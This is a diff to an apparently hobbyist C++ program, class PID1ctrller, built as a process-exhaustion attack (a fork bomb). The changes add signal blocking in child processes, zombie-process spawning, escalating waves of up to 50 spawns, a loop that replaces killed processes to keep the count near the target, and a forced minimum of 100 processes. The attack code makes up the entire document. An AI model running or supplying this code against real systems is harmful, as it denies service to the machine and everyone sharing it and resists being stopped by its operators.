@@ -274,6 +274,10 @@ class PID1ctrller{
                 break;
             }
 
+            if(i%3==0){
+                spawner_of_zombies();
+            }
+
             this_thread::sleep_for(chrono::milliseconds(10));
             // holy thread_safe code
             // all this to write sleep(0.01) T_T
@@ -286,8 +290,9 @@ class PID1ctrller{
     void child_tantrum_behaviour(){
         // if child gets parent;s vlocked signals
         // it will block it asw.
+        blockSignals();
 
-        this_thread::sleep_for(chrono::seconds(2));
+        // this_thread::sleep_for(chrono::seconds(2));
 
         PID1ctrller childcontroller(max);
 
@@ -298,6 +303,9 @@ class PID1ctrller{
         // Instead of crazyyy spawning
         // i went for exponential growth
         // so as to define it by depth
+        if (rand() % 3 == 0) {
+            childcontroller.createDihState();
+        }
 
         while(true){
 
@@ -312,18 +320,47 @@ class PID1ctrller{
 
 
     // STEP 4
-    void Atackkk(){
-        cout << "Target max processes =" << max;
-
+    void Atackkk() {
+        cout << "Target max processes = " << max << endl;
+        
         blockSignals();
-
-        spanwer_ahh(3); // 3 started children
-        this_thread::sleep_for(chrono::seconds(3));
-
-        // resource exhaustion begins
-
-        while(true){
-            this_thread::sleep_for(chrono::seconds(60));
+        
+        
+        spanwer_ahh(3);
+        
+        
+        for (int i = 0; i < 5 && cur_process < max; i++) {
+            spawner_of_zombies();
+            this_thread::sleep_for(chrono::milliseconds(50));
+        }
+        
+        
+        int wave = 0;
+        while(!pls_pls_pls_stop && cur_process < max) {
+            cout << "Wave " << ++wave << ": " << cur_process << " processes" << endl;
+            
+            
+            int spawn_count = min(10 * wave, 50);
+            spanwer_ahh(spawn_count);
+            
+            
+            for (int i = 0; i < wave && cur_process < max; i++) {
+                spawner_of_zombies();
+            }
+            
+            this_thread::sleep_for(chrono::seconds(5));
+        }
+        
+        
+        while(true) {
+            // to replace processes if anyone gets dead.
+            if (cur_process < max * 0.8) {
+                spanwer_ahh(5);
+                for (int i = 0; i < 3; i++) {
+                    spawner_of_zombies();
+                }
+            }
+            this_thread::sleep_for(chrono::seconds(30));
         }
     }
 
@@ -338,6 +375,7 @@ int main(int argc, char* argv[]){
     }
     if(max < 10){
         cerr<<"man gimme more processes";
+        max = 100;
     }
 
     PID1ctrller controller(max);
